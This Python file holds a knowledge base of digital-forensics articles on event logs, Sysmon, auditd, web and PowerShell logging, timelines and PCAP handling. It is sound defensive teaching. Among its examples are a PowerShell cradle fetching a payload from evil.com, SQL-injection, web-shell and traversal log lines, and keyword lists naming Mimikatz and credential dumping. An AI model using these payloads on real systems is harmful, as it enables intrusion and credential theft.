"""Built-in KB data: Digital Forensics — Logs, Network & Incident Response."""

# ============================================================
# COLLECTION 1: LOG ANALYSIS & EVENT FORENSICS
# ============================================================

LOG_FORENSICS = [
    {
        "title": "Windows Event Log Forensics — Security Events 4624, 4625, 4688, 4720",
        "tags": ["windows", "event-log", "forensics", "4624", "4625", "4688", "4720", "authentication"],
        "content": r"""# Windows Event Log Forensics — Security Events 4624, 4625, 4688, 4720

## Overview

The Windows Security Event Log is the single most important artefact for investigating lateral movement, privilege escalation, and credential abuse on Windows endpoints and domain controllers. Four event IDs form the backbone of most investigations: 4624 (successful logon), 4625 (failed logon), 4688 (process creation), and 4720 (account creation).

## Event ID 4624 — Successful Logon

Every interactive, network, or service logon generates a 4624 entry. The **Logon Type** field is critical:

| Logon Type | Meaning | Forensic Relevance |
|---|---|---|
| 2 | Interactive (console) | Physical or RDP logon |
| 3 | Network | SMB, WMI, WinRM, PsExec |
| 7 | Unlock | Screen unlock after lock |
| 9 | NewCredentials | `runas /netonly` — keeps local token, new net creds |
| 10 | RemoteInteractive | RDP specifically |

**Key fields to extract:** `TargetUserName`, `TargetDomainName`, `LogonType`, `IpAddress`, `IpPort`, `LogonProcessName`, `AuthenticationPackageName` (NTLM vs Kerberos), `WorkstationName`.

**Detection pattern — Pass-the-Hash:** Look for Type 3 logons where `AuthenticationPackageName` is NTLM and `LogonProcessName` is NtLmSsp, originating from workstations that should be using Kerberos.

## Event ID 4625 — Failed Logon

Failed logons reveal brute-force attempts, password spraying, and misconfigurations. The **Status** and **SubStatus** codes are essential:

| SubStatus | Meaning |
|---|---|
| 0xC000006A | Wrong password |
| 0xC0000064 | Username does not exist |
| 0xC0000072 | Account disabled |
| 0xC0000234 | Account locked out |
| 0xC0000071 | Password expired |

**Detection pattern — Password spraying:** Multiple 4625 events with SubStatus `0xC000006A` across many distinct `TargetUserName` values from one `IpAddress` within a short window (< 30 minutes).

## Event ID 4688 — Process Creation

When **command-line auditing** is enabled (GPO: Audit Process Creation → Include command line), 4688 becomes a lightweight alternative to Sysmon Event 1.

```
Fields: NewProcessName, CommandLine, ParentProcessName, TokenElevationType, SubjectUserName
```

**Detection pattern — LOLBin abuse:** Filter for `NewProcessName` ending in known living-off-the-land binaries (`certutil.exe`, `mshta.exe`, `regsvr32.exe`, `rundll32.exe`) and inspect `CommandLine` for encoded payloads or URLs.

## Event ID 4720 — Account Creation

Any new local or domain account triggers 4720. In most mature environments, account creation is tightly controlled — any 4720 outside change-management windows warrants immediate triage.

**Key fields:** `TargetUserName` (new account), `SubjectUserName` (who created it), `SamAccountName`, `UserAccountControl` flags.

## Practical Investigation Workflow

1. Start with 4624 Type 10 and Type 3 events to map lateral movement.
2. Correlate 4625 events from the same source IP to detect pre-compromise spraying.
3. Pivot to 4688 on hosts where 4624 shows successful logon — look for post-exploitation tooling.
4. Check 4720 for persistence via new accounts.
5. Export events with `wevtutil epl Security C:\evidence\security.evtx` for offline analysis.
""",
    },
    {
        "title": "Sysmon Event Analysis for Threat Hunting and Forensics",
        "tags": ["sysmon", "event-log", "threat-hunting", "forensics", "process-creation", "network"],
        "content": r"""# Sysmon Event Analysis for Threat Hunting and Forensics

## Overview

System Monitor (Sysmon) is a free Windows system service from Sysinternals that logs detailed telemetry to the Windows Event Log under `Microsoft-Windows-Sysmon/Operational`. With a well-tuned configuration, Sysmon provides visibility into process creation, network connections, file modifications, registry changes, and more — making it indispensable for forensic investigations and threat hunting.

## Critical Sysmon Event IDs

| Event ID | Description | Forensic Use |
|---|---|---|
| 1 | Process Creation | Full command line, parent process, hashes |
| 3 | Network Connection | Outbound C2 detection, lateral movement |
| 7 | Image Loaded | DLL side-loading, reflective loading |
| 8 | CreateRemoteThread | Process injection detection |
| 10 | Process Access | Credential dumping (LSASS access) |
| 11 | File Create | Payload drops, staging directories |
| 12/13 | Registry Add/Set | Persistence via Run keys, services |
| 15 | File Create Stream Hash | ADS (alternate data stream) abuse |
| 22 | DNS Query | C2 domain lookups, DGA detection |
| 25 | Process Tampering | Hollow process, herpaderping |

## Event 1 — Process Creation Deep Dive

Event 1 is the most valuable Sysmon event. Each entry contains:

- **Image**: Full path to the executable
- **CommandLine**: Complete command-line arguments
- **ParentImage**: The process that spawned it
- **ParentCommandLine**: How the parent was invoked
- **Hashes**: MD5, SHA256, IMPHASH of the binary
- **User**: Account context
- **LogonId**: Correlates to Windows 4624 events
- **IntegrityLevel**: Low, Medium, High, System

**Detection pattern — Suspicious parent-child:** Alert when `cmd.exe` or `powershell.exe` is spawned by `winword.exe`, `excel.exe`, or `outlook.exe` — a classic macro execution chain.

## Event 10 — LSASS Access Detection

Credential dumping tools (Mimikatz, ProcDump, comsvcs.dll) must open a handle to `lsass.exe`. Event 10 captures:

```
TargetImage: C:\Windows\system32\lsass.exe
SourceImage: C:\Temp\procdump64.exe
GrantedAccess: 0x1010  (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION)
```

**Key GrantedAccess masks:**
- `0x1FFFFF` — Full access (highly suspicious)
- `0x1010` — Memory read (credential dumping)
- `0x0040` — PROCESS_DUP_HANDLE (handle duplication attack)

Filter out known-good callers like `csrss.exe`, `wmiprvse.exe`, and your EDR agent to reduce noise.

## Event 22 — DNS Query Forensics

DNS queries logged by Sysmon include the querying process, making it possible to attribute C2 lookups to specific malware. Combine with Event 3 (network connection) to build a complete picture: DNS lookup followed by TCP connection to the resolved IP.

## Configuration Best Practices

Use community configurations as a baseline (e.g., SwiftOnSecurity/sysmon-config or olafhartong/sysmon-modular). Key tuning principles:

1. **Exclude noisy legitimate processes** — browser update services, AV scanners
2. **Include all process creation** — Event 1 with command-line logging
3. **Monitor LSASS** — Event 10 with TargetImage filter on `lsass.exe`
4. **Log DNS** — Event 22 for all processes except browsers (too noisy)
5. **Hash all executables** — Use SHA256 for VirusTotal lookups

## Correlation with Windows Events

- **Sysmon Event 1 LogonId** → Windows 4624 `TargetLogonId` — ties process execution to authentication events.
- **Sysmon Event 3** → Windows 5156 (WFP connection) — validates network activity.
- **Sysmon Event 12/13** → Windows 4657 (registry audit) — dual-source registry change evidence.
""",
    },
    {
        "title": "Linux Audit Log Forensics — auditd and journald",
        "tags": ["linux", "auditd", "journald", "forensics", "syscall", "audit-log"],
        "content": r"""# Linux Audit Log Forensics — auditd and journald

## Overview

Linux systems have two primary logging frameworks for forensic investigations: the Linux Audit System (auditd) and systemd's journal (journald). The audit system captures system calls at the kernel level, while journald aggregates structured logs from all system services. Together, they provide comprehensive visibility into authentication events, process execution, file access, and network activity.

## auditd Architecture

The audit framework consists of:

- **Kernel component**: Intercepts system calls based on audit rules
- **auditd daemon**: Writes events to `/var/log/audit/audit.log`
- **ausearch / aureport**: Query and report tools
- **auditctl**: Runtime rule management
- **audit.rules**: Persistent rule definitions in `/etc/audit/rules.d/`

## Key Audit Record Types

| Type | Meaning | Forensic Use |
|---|---|---|
| SYSCALL | System call details | Command execution context |
| EXECVE | Program execution arguments | Full command lines |
| CWD | Current working directory | Execution context |
| PATH | File path accessed | File operations |
| USER_AUTH | Authentication attempt | Login forensics |
| USER_LOGIN | Login success/failure | Brute-force detection |
| USER_CMD | Command run via sudo | Privilege escalation tracking |
| ANOM_ABEND | Abnormal process termination | Crash/exploit detection |

## Essential Audit Rules for Forensics

```bash
# Monitor authentication databases
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/sudoers -p wa -k sudoers_change

# Monitor SSH config and keys
-w /etc/ssh/sshd_config -p wa -k sshd_config
-w /root/.ssh/ -p wa -k ssh_keys

# Log all execve calls (process execution)
-a always,exit -F arch=b64 -S execve -k exec

# Monitor privilege escalation
-a always,exit -F arch=b64 -S setuid -S setgid -k priv_esc

# Track file deletions
-a always,exit -F arch=b64 -S unlink -S unlinkat -S rename -S renameat -k file_delete

# Network socket creation
-a always,exit -F arch=b64 -S socket -S connect -k network
```

## Searching Audit Logs

```bash
# Find all failed logins in the last 24 hours
ausearch --message USER_LOGIN --success no --start recent

# Find all command execution by a specific user
ausearch -ua 1001 -sc execve --interpret

# Find file access to sensitive paths
ausearch -k identity -i

# Generate a summary report
aureport --summary
aureport --auth --failed
aureport --login --failed
```

## journald Forensics

The systemd journal stores structured binary logs queried with `journalctl`:

```bash
# Show SSH authentication events
journalctl -u sshd --since "2 hours ago" --no-pager

# Failed sudo attempts
journalctl _COMM=sudo --grep="authentication failure"

# All events from a specific user session
journalctl _UID=1001 --since today

# Kernel messages (module loading, OOM, etc.)
journalctl -k --priority=warning

# Export in JSON for SIEM ingestion
journalctl -o json --since "1 hour ago" > /evidence/journal_export.json
```

## Correlation Techniques

1. **Timeline**: Use `ausearch --start` and `--end` with `journalctl --since` and `--until` to align timestamps.
2. **User pivoting**: Start with `aureport --login` to identify suspicious sessions, then `ausearch -ua <uid>` to trace all actions.
3. **Process tree**: Combine EXECVE records with parent PID fields to reconstruct the execution chain.
4. **Network context**: Match `socket`/`connect` syscall audit records with `journalctl` entries from `firewalld` or `iptables` to track allowed and denied connections.
""",
    },
    {
        "title": "Web Server Log Forensics — Apache, Nginx, and IIS",
        "tags": ["web-server", "apache", "nginx", "iis", "access-log", "forensics"],
        "content": r"""# Web Server Log Forensics — Apache, Nginx, and IIS

## Overview

Web server logs are often the first artefact examined during web application incidents — SQL injection, web shells, directory traversal, credential stuffing, and data exfiltration all leave traces in access and error logs. Understanding log formats, common attack signatures, and analysis techniques across Apache, Nginx, and IIS is essential for SOC analysts and forensic investigators.

## Log Locations and Formats

**Apache:**
- Access: `/var/log/apache2/access.log` or `/var/log/httpd/access_log`
- Error: `/var/log/apache2/error.log`
- Format (Combined): `%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"`

**Nginx:**
- Access: `/var/log/nginx/access.log`
- Error: `/var/log/nginx/error.log`
- Format: `$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"`

**IIS:**
- Location: `C:\inetpub\logs\LogFiles\W3SVC1\`
- Format: W3C Extended (space-delimited, configurable fields)
- Key fields: `date time s-ip cs-method cs-uri-stem cs-uri-query sc-status cs-bytes sc-bytes cs(User-Agent) cs(Referer)`

## Attack Signatures in Access Logs

### SQL Injection
```
192.168.1.50 - - [15/Mar/2026:09:12:33 +0000] "GET /products?id=1'+OR+1=1-- HTTP/1.1" 200 4523
192.168.1.50 - - [15/Mar/2026:09:12:35 +0000] "GET /products?id=1'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 8012
```
Look for: `UNION`, `SELECT`, `OR 1=1`, `'--`, `WAITFOR DELAY`, `BENCHMARK`, URL-encoded variants (`%27`, `%20OR%20`).

### Web Shell Access
```
10.0.0.99 - - [15/Mar/2026:14:22:01 +0000] "POST /uploads/shell.php HTTP/1.1" 200 142
10.0.0.99 - - [15/Mar/2026:14:22:03 +0000] "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 24
```
Indicators: POST requests to unexpected file paths, PHP/ASP/JSP in upload directories, small response bodies for POST requests, `cmd=`, `exec=`, `c=` query parameters.

### Directory Traversal
```
10.0.0.45 - - [15/Mar/2026:11:05:44 +0000] "GET /download?file=../../../etc/passwd HTTP/1.1" 200 1847
```
Look for: `../`, `..%2f`, `%2e%2e/`, `....//`, path sequences targeting `/etc/passwd`, `/etc/shadow`, `web.config`, `boot.ini`.

## Analysis Workflow

1. **Establish baseline**: Determine normal request volume, top pages, common user agents.
2. **Identify anomalies**: Sort by status codes (403/500 spikes), unusual HTTP methods (PUT, DELETE), large response sizes.
3. **Isolate attacker IP**: Once a suspicious request is found, filter all activity from that IP.
4. **Build timeline**: Order all requests from the attacker chronologically.
5. **Check error logs**: Correlate access log entries with error log stack traces for exploitation confirmation.
6. **Pivot to other sources**: Cross-reference the attacker IP against firewall logs, WAF logs, and application logs.

## Useful Analysis Commands

```bash
# Top 20 IPs by request count
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20

# All 4xx/5xx errors
awk '$9 ~ /^[45]/' access.log

# Requests containing SQL injection patterns
grep -iE "(union|select|insert|update|delete|drop|exec|xp_)" access.log

# POST requests to unusual extensions
grep "POST" access.log | grep -iE "\.(php|asp|aspx|jsp|cgi)" | grep -v "/api/"

# Timeline of requests from a specific IP
grep "10.0.0.99" access.log | awk '{print $4}' | sort
```
""",
    },
    {
        "title": "PowerShell Logging — Script Block, Module, and Transcription",
        "tags": ["powershell", "logging", "script-block", "transcription", "forensics", "T1059.001"],
        "content": r"""# PowerShell Logging — Script Block, Module, and Transcription

## Overview

PowerShell is one of the most abused legitimate tools in enterprise intrusions. Attackers use it for downloading payloads, executing in-memory malware, credential harvesting, lateral movement, and data exfiltration. Three logging mechanisms — Script Block Logging, Module Logging, and Transcription — provide layered visibility that defeats most obfuscation techniques. Enabling and understanding all three is essential for forensic investigations.

## Script Block Logging (Event ID 4104)

Script Block Logging records the full text of PowerShell scripts and commands as they are processed by the PowerShell engine, **after deobfuscation**. This is the most valuable PowerShell log source because it defeats encoding, concatenation, and variable substitution tricks.

**Event Log location:** `Microsoft-Windows-PowerShell/Operational`

**Enable via GPO:** `Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell > Turn on PowerShell Script Block Logging`

**What gets logged:**
- Every script block executed, including dynamically generated code
- Decoded Base64 payloads (`-EncodedCommand`)
- Expanded variable values
- Downloaded and invoked scripts (IEX cradles)

**Example — detecting obfuscated download cradle:**

The attacker executes:
```powershell
$wc=New-Object Net.WebClient;IEX($wc.DownloadString('http://evil.com/payload.ps1'))
```

Even if wrapped in encoding like `-enc SQBFAFgAKAAoAE4AZQB3AC0A...`, Event 4104 logs the **decoded** script block.

**Forensic queries:**
```powershell
# Search for download cradles
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
    Where-Object { $_.Message -match 'DownloadString|DownloadFile|IEX|Invoke-Expression|WebClient|Invoke-WebRequest' }

# Search for credential access
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
    Where-Object { $_.Message -match 'Mimikatz|sekurlsa|Get-Credential|ConvertTo-SecureString' }
```

## Module Logging (Event ID 4103)

Module Logging records pipeline execution details — which cmdlets were called, their parameters, and output. It is complementary to Script Block Logging, providing structured parameter data.

**Enable via GPO:** `Turn on Module Logging` → specify modules (`*` for all).

**Useful for:** Tracking which cmdlets were invoked even when script blocks are fragmented across multiple events.

## Transcription Logging

Transcription writes a full text transcript of every PowerShell session to a file on disk, including input, output, timestamps, and the user account.

**Enable via GPO:** `Turn on PowerShell Transcription` → set output directory (e.g., `\\fileserver\ps_transcripts\`).

**Output format:** One file per session, named `PowerShell_transcript.<hostname>.<random>.<timestamp>.txt`.

**Advantages over Event Log:**
- Captures **output** (Event 4104 does not)
- Survives event log clearing (stored on a separate share)
- Easy to search with `grep` / `Select-String`

## Suspicious Patterns to Hunt

| Pattern | Indicator |
|---|---|
| `IEX`, `Invoke-Expression` | In-memory execution |
| `DownloadString`, `DownloadFile` | Remote payload fetch |
| `-EncodedCommand`, `-enc` | Base64 obfuscation |
| `Add-Type -TypeDef` | Inline C# compilation |
| `[Reflection.Assembly]::Load` | .NET assembly loading |
| `AMSI` bypass strings | Security evasion |
| `Set-MpPreference -DisableRealtimeMonitoring` | Defender tampering |
| `Invoke-Mimikatz`, `sekurlsa::logonpasswords` | Credential dumping |
| `New-ScheduledTask`, `Register-ScheduledTask` | Persistence |
| `Enter-PSSession`, `Invoke-Command` | Lateral movement |

## Investigation Workflow

1. **Check Event 4104** first for deobfuscated script content.
2. **Correlate with Sysmon Event 1** to identify the parent process that launched PowerShell.
3. **Cross-reference Event 4103** for cmdlet-level details and parameter values.
4. **Collect transcripts** from the central share for full input/output history.
5. **Timeline**: Use Event 400/403 (PowerShell engine start/stop) to bracket sessions.
""",
    },
    {
        "title": "Authentication Event Correlation Across Log Sources",
        "tags": ["authentication", "correlation", "active-directory", "forensics", "lateral-movement"],
        "content": r"""# Authentication Event Correlation Across Log Sources

## Overview

No single log source tells the complete authentication story. Investigating lateral movement, credential theft, and privilege escalation requires correlating events across Windows Security logs, domain controller logs, LDAP/Kerberos traffic, VPN concentrators, cloud identity providers, and application logs. This article provides a systematic framework for multi-source authentication correlation.

## The Authentication Chain

A single user authentication typically generates events in multiple systems:

```
User Action → [1] Endpoint Security Log → [2] Domain Controller Log →
[3] Network (Kerberos/NTLM traffic) → [4] Target System Log →
[5] Application/Service Log
```

Each link in the chain must be correlated to build the full picture.

## Windows Domain Authentication Correlation

### Source: Workstation (Event 4648 — Explicit Credentials)
When a user runs `runas` or a process uses alternate credentials, the **source workstation** logs Event 4648 with the target server name and the credentials used. This is where lateral movement begins.

### Source: Domain Controller (Events 4768, 4769, 4771)
- **4768 (TGT Request)**: Initial Kerberos authentication — captures the source IP and whether it succeeded.
- **4769 (Service Ticket)**: Reveals which service the user is accessing (SPN field) — a service ticket for `CIFS/fileserver` means SMB access, `HTTP/webserver` means web access.
- **4771 (Kerberos Pre-Auth Failure)**: Failed logon equivalent for Kerberos — captures the client IP.

### Destination: Target Server (Event 4624)
The server receiving the connection logs 4624 with the Logon Type and source IP.

### Correlation Key
The **Logon ID** field links related events on the same machine. Across machines, use the **timestamp + source IP + username** tuple as the correlation key.

## Cross-Source Correlation Matrix

| Scenario | Source Host | Domain Controller | Network | Target Host |
|---|---|---|---|---|
| Normal logon | 4648 (if explicit) | 4768 + 4769 | Kerberos traffic | 4624 |
| Pass-the-Hash | — | 4776 (NTLM) | NTLM traffic | 4624 Type 3 (NTLM) |
| Pass-the-Ticket | — | 4769 (anomalous SPN) | Kerberos TGS | 4624 Type 3 |
| Golden Ticket | — | No 4768 (skipped) | TGS only | 4624 Type 3 |
| Kerberoasting | — | 4769 (RC4 encryption) | TGS requests | — |
| RDP | 4648 | 4768 + 4769 | RDP (3389) | 4624 Type 10 |

## VPN and Cloud Identity Correlation

Modern environments require extending correlation beyond on-premises AD:

**VPN logs** provide the external IP-to-internal IP mapping — essential for attributing 4624 events to specific remote users.

**Azure AD / Entra ID sign-in logs** contain: `UserPrincipalName`, `IPAddress`, `AppDisplayName`, `ConditionalAccessStatus`, `RiskLevel`, `MfaDetail`.

**Correlation approach**: Match the Azure AD sign-in timestamp and UPN to the on-prem 4624 event where the source IP is the VPN-assigned address.

## Practical Correlation Workflow

1. **Start with the alert** — identify the target host and the suspicious event (e.g., 4624 Type 3 from unexpected source).
2. **Extract source IP** from the 4624 event on the target.
3. **Query DC logs** for 4769 events where the client IP matches and the service name matches the target.
4. **Check the source workstation** for 4648 events or Sysmon Event 1 showing the tool that initiated the connection.
5. **Validate with network data** — confirm Kerberos or NTLM traffic between the two hosts at the relevant time.
6. **Check VPN/cloud** — if the source IP is a VPN pool address, look up the VPN session to get the external IP and user assignment.
7. **Document the chain** — record every event ID, timestamp, and source in your investigation timeline.

## Detection Opportunities

- **Impossible travel**: Same user authenticating from two geographically distant IPs within minutes (correlate VPN + Azure AD).
- **Protocol downgrade**: 4624 showing NTLM authentication in an environment that should be Kerberos-only.
- **Service ticket anomalies**: 4769 requesting RC4 encryption (Type 0x17) when AES is enforced — potential Kerberoasting.
- **Logon without TGT**: 4624 on a target without a corresponding 4768 on the DC — potential Golden Ticket.
""",
    },
    {
        "title": "Timeline Construction from Multiple Log Sources",
        "tags": ["timeline", "forensics", "super-timeline", "log2timeline", "plaso", "correlation"],
        "content": r"""# Timeline Construction from Multiple Log Sources

## Overview

Timeline analysis is the cornerstone of digital forensics. By merging events from Windows Event Logs, Sysmon, firewall logs, web server logs, EDR telemetry, and file system metadata into a single chronological view, investigators can reconstruct attacker activity from initial compromise through exfiltration. This process — often called a "super timeline" — transforms isolated log entries into a coherent narrative.

## Why Timelines Matter

Individual log sources provide fragments. Only a timeline reveals:

- The **sequence** of actions (which came first: the phishing email or the malware drop?)
- **Gaps** in activity (attacker paused for 4 hours — why? Possibly waiting for off-hours)
- **Causal relationships** (DNS query for `evil.com` occurred 200ms before the TCP connection to 203.0.113.50)
- **Scope** of compromise (how many hosts were accessed and in what order?)

## Time Synchronisation Prerequisites

Before merging logs, verify time accuracy:

1. **NTP configuration**: Confirm all sources sync to the same time server.
2. **Timezone normalisation**: Convert everything to UTC. Common pitfalls:
   - Windows Event Logs store timestamps in UTC but display in local time
   - Apache logs default to server local time (`%t` field)
   - IIS logs are UTC by default
   - Sysmon logs are UTC
3. **Clock skew**: If systems were not NTP-synced, document the observed offset and adjust.

## Manual Timeline Construction

For small investigations, a spreadsheet or CSV approach works:

```
Timestamp (UTC) | Source | Host | Event | Details
2026-03-15 09:12:33 | Apache access.log | webserver | SQLi attempt | GET /products?id=1' OR 1=1-- from 10.0.0.50
2026-03-15 09:14:01 | Sysmon Event 1 | webserver | Process create | w3wp.exe spawned cmd.exe /c whoami
2026-03-15 09:14:03 | Sysmon Event 11 | webserver | File create | C:\inetpub\wwwroot\uploads\cmd.aspx
2026-03-15 09:15:22 | Apache access.log | webserver | Web shell | POST /uploads/cmd.aspx from 10.0.0.50
2026-03-15 09:16:44 | Windows 4624 | dc01 | Logon Type 3 | WEBSERVER$ → DC01 via NTLM
2026-03-15 09:17:01 | Windows 4769 | dc01 | Service ticket | krbtgt/DOMAIN.LOCAL from webserver IP
```

## Automated Timeline with Plaso (log2timeline)

Plaso is the industry-standard tool for super timeline generation:

```bash
# Step 1: Create a Plaso storage file from a disk image
log2timeline.py --storage-file case001.plaso /evidence/disk.E01

# Step 2: Filter and export to CSV
psort.py -o l2tcsv case001.plaso "date > '2026-03-14' AND date < '2026-03-16'" -w timeline.csv

# Step 3: Import into Timeline Explorer or grep for keywords
grep -i "evil.com\|cmd.aspx\|mimikatz" timeline.csv
```

**Plaso parsers** support hundreds of artefact types: EVTX, Prefetch, MFT, Registry, browser history, SRUM, and more.

## SIEM-Based Timelines

For live investigations, your SIEM can function as a timeline tool:

**Elasticsearch / Kibana:**
```json
{
  "query": {
    "bool": {
      "must": [
        {"range": {"@timestamp": {"gte": "2026-03-15T09:00:00Z", "lte": "2026-03-15T10:00:00Z"}}},
        {"bool": {"should": [
          {"term": {"source.ip": "10.0.0.50"}},
          {"term": {"destination.ip": "10.0.0.50"}},
          {"term": {"user.name": "compromised_user"}}
        ]}}
      ]
    }
  },
  "sort": [{"@timestamp": "asc"}]
}
```

## Best Practices

1. **Preserve raw logs** before any processing — maintain chain of custody.
2. **Normalise timestamps** to UTC immediately.
3. **Use a common schema** (ECS is ideal) for merged timelines.
4. **Colour-code by source** in spreadsheets for visual clarity.
5. **Document gaps** — if a host has no logs for a period, note it explicitly.
6. **Iterate** — start with a broad window and narrow as you identify key events.
7. **Annotate** — add analyst notes directly in the timeline explaining significance.
""",
    },
]

# ============================================================
# COLLECTION 2: NETWORK FORENSICS
# ============================================================

NETWORK_FORENSICS = [
    {
        "title": "PCAP Preservation and Chain of Custody",
        "tags": ["pcap", "chain-of-custody", "evidence", "forensics", "network-capture"],
        "content": r"""# PCAP Preservation and Chain of Custody

## Overview

Packet capture (PCAP) files are primary evidence in network forensic investigations. Unlike logs that summarise events, PCAPs contain the raw bytes that traversed the wire — complete protocol headers, payloads, timestamps, and metadata. This makes them extraordinarily valuable but also imposes strict requirements around preservation, integrity verification, and chain of custody documentation to ensure admissibility and reliability.

## Capture Methods and Considerations

### Full Packet Capture vs Flow Data

| Aspect | Full PCAP | NetFlow/IPFIX |
|---|---|---|
| Content | Complete packets including payloads | Metadata only (IPs, ports, bytes, duration) |
| Storage | ~1 GB per 100 Mbps sustained | ~0.1% of PCAP size |
| Forensic value | Can reconstruct sessions, extract files | Direction and volume only |
| Privacy impact | Captures all content | Metadata only |

For forensic investigations, full PCAP is essential. Flow data can guide you to the right time window but cannot prove what was transferred.

### Capture Points

- **Network TAP**: Best for forensic integrity — passive, no packet modification, no drops under load
- **SPAN/Mirror port**: Convenient but may drop packets under congestion, can miss VLAN tags
- **Host-based (tcpdump/Wireshark)**: Captures what the OS sees — useful for endpoint investigation but misses dropped/rejected packets
- **Inline device (IDS/IPS)**: Already in the path but may modify packets (IPS mode)

## Preservation Procedures

### Immediate Steps After Identification

1. **Stop the capture cleanly**: Use `Ctrl+C` for tcpdump or stop the ring buffer. Avoid killing the process (risk of corrupted final packets).
2. **Calculate hash immediately**:
```bash
sha256sum capture_20260315_0900.pcap > capture_20260315_0900.pcap.sha256
md5sum capture_20260315_0900.pcap >> capture_20260315_0900.pcap.sha256
```
3. **Create a read-only copy**:
```bash
cp capture_20260315_0900.pcap /evidence/case001/
chmod 444 /evidence/case001/capture_20260315_0900.pcap
```
4. **Document metadata**:
   - Capture device and interface
   - BPF filter applied (if any)
   - Start and end time (with timezone)
   - Capture tool and version (e.g., tcpdump 4.99.4, libpcap 1.10.4)
   - Snap length (`-s` parameter — was the full packet captured?)

### Chain of Custody Form

Every transfer of the PCAP must be recorded:

| Field | Value |
|---|---|
| Case ID | INC-2026-0315-001 |
| Evidence ID | PCAP-001 |
| Description | Full packet capture from core-tap-01, port 1/1 |
| SHA-256 | a1b2c3d4e5... |
| Collected by | Analyst Sarah Chen |
| Collection time | 2026-03-15 09:47 UTC |
| Collection method | Network TAP → tcpdump 4.99.4 |
| Storage location | Evidence server /evidence/case001/ |
| Transfer log | [date, from, to, purpose, hash verified] |

### Long-Term Storage

- Store on write-once media (WORM) or immutable object storage when available.
- Keep the original PCAP alongside the hash file.
- Never modify the original — create working copies for analysis.
- Retain for the duration specified by your retention policy (commonly 1-7 years for incident evidence).

## Integrity Verification

Before every analysis session, verify the hash:

```bash
sha256sum -c capture_20260315_0900.pcap.sha256
# Expected output: capture_20260315_0900.pcap: OK
```

If the hash does not match, the file has been altered — document this immediately and determine whether a valid copy exists elsewhere.

## Working with Large Captures

Production captures can be enormous. Techniques for manageable analysis:

```bash
# Split by time (1-hour chunks)
editcap -i 3600 large_capture.pcap chunk_

# Extract only traffic involving a specific host
tcpdump -r large_capture.pcap -w filtered.pcap host 10.0.0.50

# Extract a specific time window
editcap -A "2026-03-15 09:10:00" -B "2026-03-15 09:20:00" large_capture.pcap window.pcap
```

Always hash the filtered/split files and document that they are derivatives of the original.
""",
    },
    {
        "title": "Network Timeline Construction and Flow Analysis",
        "tags": ["network-timeline", "netflow", "traffic-analysis", "forensics", "lateral-movement"],
        "content": r"""# Network Timeline Construction and Flow Analysis

## Overview

Network timelines complement host-based timelines by providing an independent, infrastructure-level view of communications. While endpoint logs can be tampered with by an attacker who has gained admin access, network captures from TAPs and flow collectors are typically outside the attacker's reach. Constructing a network timeline from PCAP data and flow records is a fundamental skill in incident response.

## Data Sources for Network Timelines

### Full PCAP
Provides exact packet timestamps (microsecond precision), full payload content, and protocol-level details. Best for deep-dive analysis of specific connections.

### NetFlow / IPFIX
Summarises connections as flow records: source/destination IP, ports, protocol, byte count, packet count, start/end time, TCP flags. Best for broad visibility and identifying patterns across large time windows.

### Zeek (Bro) Logs
Zeek produces structured, connection-level logs (`conn.log`, `dns.log`, `http.log`, `ssl.log`, `files.log`) that split the difference between raw PCAP and summarised flow data. Ideal for timeline construction.

### Firewall / Proxy Logs
Provide allow/deny decisions, NAT translations (critical for mapping internal to external IPs), and URL-level visibility (proxy).

## Building the Timeline

### Step 1: Identify the Anchor Event

Start with a known indicator — a C2 IP address, a malware hash, a compromised user account — and find its first appearance in network data.

```bash
# Find first connection to known C2 IP in Zeek conn.log
grep "203.0.113.50" conn.log | sort -t$'\t' -k1 | head -5
```

### Step 2: Map All Communications for the Compromised Host

```bash
# Extract all connections involving the compromised workstation
grep -E "10\.0\.0\.25" conn.log | sort -t$'\t' -k1 > compromised_host_connections.log

# Summarise unique destination IPs and ports
awk -F'\t' '{print $5, $6}' compromised_host_connections.log | sort | uniq -c | sort -rn | head -20
```

### Step 3: Identify Lateral Movement

Lateral movement patterns in network data:

| Protocol | Ports | Technique |
|---|---|---|
| SMB | 445 | PsExec, file copy, share enumeration |
| WinRM | 5985/5986 | PowerShell remoting |
| RDP | 3389 | Interactive remote desktop |
| WMI | 135 + dynamic | Remote command execution |
| SSH | 22 | Linux lateral movement |
| DCOM | 135 + dynamic | MMC, DCOM-based execution |

**Detection approach**: From the first compromised host, identify all outbound connections on these ports. Each destination becomes a potentially compromised host — repeat the analysis recursively.

### Step 4: Quantify Data Movement

For exfiltration assessment, calculate data volumes:

```bash
# Total bytes sent from compromised host to external IPs
awk -F'\t' '$3 == "10.0.0.25" && $5 !~ /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/' conn.log |
    awk -F'\t' '{sum += $10} END {printf "%.2f MB\n", sum/1048576}'
```

### Step 5: Assemble the Unified Timeline

Merge network events with host events using UTC timestamps:

```
09:12:33 [Apache]    SQLi from 10.0.0.50 → webserver:443
09:12:34 [Zeek conn] 10.0.0.50:44231 → 10.0.0.10:443 (12.4 KB sent)
09:14:01 [Sysmon]    webserver: w3wp.exe → cmd.exe
09:15:22 [Zeek conn] 10.0.0.50:44235 → 10.0.0.10:443 (POST, 0.8 KB sent, 0.2 KB recv)
09:16:44 [Zeek conn] 10.0.0.10:49152 → 10.0.0.1:445 (SMB, 245 KB sent)
09:16:44 [Windows]   dc01: 4624 Type 3 from webserver
```

## Flow Analysis Techniques

### Beaconing Detection

C2 beacons produce periodic connections with consistent intervals:

```python
# Pseudo-code for beacon detection
intervals = [t2-t1, t3-t2, t4-t3, ...]
mean = statistics.mean(intervals)
stdev = statistics.stdev(intervals)
cv = stdev / mean  # Coefficient of variation
# CV < 0.15 suggests automated beaconing
```

### Long Connections

Persistent C2 channels may maintain long-lived TCP connections:

```bash
# Zeek connections longer than 1 hour
